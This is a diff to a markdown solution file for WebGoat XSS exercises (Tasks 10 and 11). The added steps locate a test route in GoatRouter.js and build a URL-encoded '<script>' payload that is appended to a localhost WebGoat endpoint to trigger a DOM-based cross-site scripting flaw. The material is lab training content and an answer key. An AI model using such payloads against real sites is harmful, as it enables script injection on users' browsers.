@@ -18,11 +18,24 @@
 
 # Task 10
 
+1. Find the test route
+2. Go to developing tools
+3. Exploit js files
+4. Find file GoatRouter.js
+5. Find testRoute in given file
+6. U can see lines below
+
 ```
-https://docs.cycubix.com/web-application-security-essentials/solutions/a7-cross-site-scripting-xss/xss-10
+  routes: {
+            'welcome': 'welcomeRoute',
+            'lesson/:name': 'lessonRoute',
+            'lesson/:name/:pageNum': 'lessonPageRoute',
+            'test/:param': 'testRoute',
+            'reportCard': 'reportCard'
+        },
 ```
 
-TO DO - instructions
+7.
 
 Answer
 
@@ -32,17 +45,26 @@ start.mvc#test/
 
 # task 11
 
-```
-https://www.youtube.com/watch?v=ZpMkLgsSDGk&ab_channel=PseudoTime
-```
-
-Answer
+1. We are about to run script
 
 ```
-333175659
-albo
-1685870147
+<script>webgoat.customjs.phoneHome(); </script>
 ```
+
+2. Encode this script as url
+
+```
+%3c%73%63%72%69%70%74%3e%77%65%62%67%6f%61%74%2e%63%75%73%74%6f%6d%6a%73%2e%70%68%6f%6e%65%48%6f%6d%65%28%29%3b%20%3c%2f%73%63%72%69%70%74%3e
+```
+
+3. Page is valnerable in sense of xss. test endpoint can preview everything
+4. Concatenate test endpoint with encoded script
+
+```
+http://localhost:8080/WebGoat/start.mvc#test/%3c%73%63%72%69%70%74%3e%77%65%62%67%6f%61%74%2e%63%75%73%74%6f%6d%6a%73%2e%70%68%6f%6e%65%48%6f%6d%65%28%29%3b%20%3c%2f%73%63%72%69%70%74%3e
+```
+
+5. CHeck console to get number
 
 # task 12
 
